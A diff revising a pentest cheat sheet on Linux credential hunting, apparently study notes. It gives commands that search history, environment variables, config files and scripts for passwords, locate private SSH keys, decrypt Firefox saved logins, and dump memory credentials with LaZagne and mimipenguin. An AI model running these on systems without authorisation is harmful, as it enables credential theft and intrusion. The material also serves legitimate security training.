@@ -1,103 +1,95 @@
-# Credential Hunting Linux
-```table-of-contents
-```
-## File Enumeration
-### Configuration Files
-**Search Command:**
-```shell
-# Find config files excluding standard library paths
-for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
-```
-
-**Grepping for Credentials:** Once files are identified, search inside them for keywords like `user`, `password`, or `pass`.
-```shell
-# Search specific file extensions for sensitive strings (ignoring comments)
-for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
-```
-### Databases
-```shell
-# Find database files
-for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
-```
-### Scripts & Notes
-- **Scripts:** (`.py`, `.sh`, `.pl`, etc.) often contain hardcoded automation credentials. 
-- **Notes:** Users often save credentials in text files in their home directories.
-```shell
-# Find scripts
-for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
-
-# Find text files in home directories (excluding dotfiles)
-find /home/* -type f -name "*.txt" -o ! -name "*.*"
-```
-### Cronjobs
-- **System-wide:** `/etc/crontab`
-- **Hourly/Daily/etc:** `/etc/cron.*`
-- **User-specific:** `/var/spool/cron/crontabs/`
-```shell
-# Check system crontab
-cat /etc/crontab
-
-# List all cron directories
-ls -la /etc/cron.*/
-```
-### SSH Keys
-```shell
-# Find Private Keys
-grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
-
-# Find Public Keys (useful for pivoting/identification)
-grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
-```
-## History & Logs
+# Linux Credential Hunting (Pillaging)
+**Concept:** Users and Admins are lazy. They reuse passwords, hardcode credentials in scripts, and leave secrets in cleartext config files. 
+**Goal:** Find these secrets to escalate privileges or pivot.
+## 1. The Low Hanging Fruit (History & Env)
+**Check First:** Before running noisy `find` commands, check the immediate environment.
 ### Shell History
+**Context:** Admins often type passwords into the CLI (e.g., `mysql -pPassword123`) or paste credentials by accident.
 ```shell
-# Check bash history for typical patterns
-tail -n5 /home/*/.bash*
-cat ~/.bash_history | grep -i "pass"
-```
-### Log Files
-**Key Log Locations:**
+# Check current user's history
+cat ~/.bash_history
+cat ~/.zshrc_history
+grep -i "pass" ~/.bash_history
 
-| **Log File**                      | **Description**                          |
-| ----------------------------- | ------------------------------------ |
-| `/var/log/syslog`             | Generic system activity.             |
-| `/var/log/auth.log`           | Authentication logs (Debian/Ubuntu). |
-| `/var/log/secure`             | Authentication logs (RHEL/CentOS).   |
-| `/var/log/apache2/access.log` | Web server access logs.              |
-| `/var/log/cron`               | Cron job logs.                       |
-**Grepping Logs:**
-```shell
-# Search logs for keywords like "password", "accepted", "session opened"
-grep -rE "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND\=|logs" /var/log/ 2>/dev/null
+# Check ALL users' history (If you have read access to /home)
+tail -n 20 /home/*/.bash_history
 ```
-## Memory & Automated Tools
-### Mimipenguin
+### Environment Variables
+**Context:** Docker containers and cloud instances often pass secrets via ENV vars.
 ```shell
-# Requires sudo/root
+env | grep -iE "pass|key|secret|token"
+```
+## 2. File System Enumeration (Grep is King)
+**Goal:** Find configuration files, scripts, or backups containing keywords.
+### Configuration Files
+**Context:** Apps like WordPress (`wp-config.php`) or database clients save creds here.
+```shell
+# Search specific extensions for "user/pass" keywords
+# 2>/dev/null hides "Permission Denied" errors
+grep -rnE "user|password|pass" . --include=*.{conf,config,xml,ini,json,yaml} 2>/dev/null | grep -v "lib\|fonts\|share\|core"
+```
+### Scripts & Source Code
+**Context:** Developers hardcode credentials in automation scripts (`.py`, `.sh`, `.pl`).
+```shell
+# Find scripts and grep inside them
+grep -rnE "user|password|pass" /opt /var/www /home --include=*.{py,sh,pl,php,js} 2>/dev/null
+```
+### Database Files
+**Context:** SQLite databases often store app data in single files.
+```shell
+# Find DB files
+find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null
+```
+## 3. SSH Keys (The Golden Ticket)
+**Goal:** Find private keys (`id_rsa`) to SSH into other boxes or even back into localhost as root.
+```shell
+# Search for Private Keys (Recursively)
+grep -rnw "PRIVATE KEY" /home/* 2>/dev/null
+
+# Search for Authorized Keys (To see who can log in here)
+grep -rnw "ssh-rsa" /home/* 2>/dev/null
+```
+## 4. Browser Forensics (Firefox)
+**Context:** Users save passwords in browsers. If you are on a workstation (not just a server), this is high-value. 
+**Location:** `~/.mozilla/firefox/<profile_folder>/`
+### Manual Extraction (Firefox Decrypt)
+**Tool:** `firefox_decrypt.py` (Needs to be uploaded to target or profile downloaded to attacker).
+```shell
+# 1. Locate the profile
+ls -la ~/.mozilla/firefox/
+
+# 2. Run the tool against the profile
+python3 firefox_decrypt.py ~/.mozilla/firefox/xy123.default
+
+# Output:
+# Website:   https://internal-admin.corp
+# User:      admin
+# Pass:      SuperSecret123!
+```
+## 5. Automated Tools (Lazy Way)
+**Note:** These tools are "noisy" and may trigger AV/EDR.
+### LaZagne (Python)
+**Scope:** Browsers, Git, SVN, Wifi, Databases, Sysadmin tools.
+```shell
+# Download and run (Standalone binary recommended if Python missing)
+python3 laZagne.py all
+```
+### Mimipenguin (Requires Root)
+**Scope:** Dumps cleartext passwords from memory (Gnome Keyring, vsftpd, apache), similar to Mimikatz on Windows.
+```shell
+# Must be run as root/sudo
 sudo python3 mimipenguin.py
 ```
-### LaZagne
-- **Browsers:** Firefox, Chrome, Opera. 
-- **Sysadmin:** SSH, VNC, Filezilla, AWS.
-- **Configuration:** Grub, fstab.
-- **Wifi:** Network Manager.
-```shell
-# Run all modules
-python3 laZagne.py all
+## 6. System Logs
+**Context:** Services log authentication failures, and sometimes (misconfigured) successes with passwords.
 
-# Run specific module (e.g., browsers)
-python3 laZagne.py browsers
-```
-## Browser Credentials (Firefox)
-**Location:** `~/.mozilla/firefox/<profile_folder>/`
-### Manual Decryption (Firefox Decrypt)
-[Firefox_decrypt](https://github.com/unode/firefox_decrypt)
+| **Log File**                      | **Description**                                                 |
+| ----------------------------- | ----------------------------------------------------------- |
+| `/var/log/auth.log`           | SSH/Sudo logs (Debian/Ubuntu). **Check for sudo commands.** |
+| `/var/log/secure`             | Authentication logs (RHEL/CentOS).                          |
+| `/var/log/apache2/access.log` | Web server access. Check for credentials in GET parameters. |
+| `/var/log/syslog`             | Generic system activity.                                    |
 ```shell
-# Usage: python3 firefox_decrypt.py <path_to_profile_optional>
-python3 firefox_decrypt.py
-
-# Output Example:
-# Website:   https://www.inlanefreight.com
-# Username: 'cry0l1t3'
-# Password: 'FzXUxJemKm6g2lGh'
+# Search logs for "password" or "failed"
+grep -rE "password|failed|success" /var/log/ 2>/dev/null
 ```
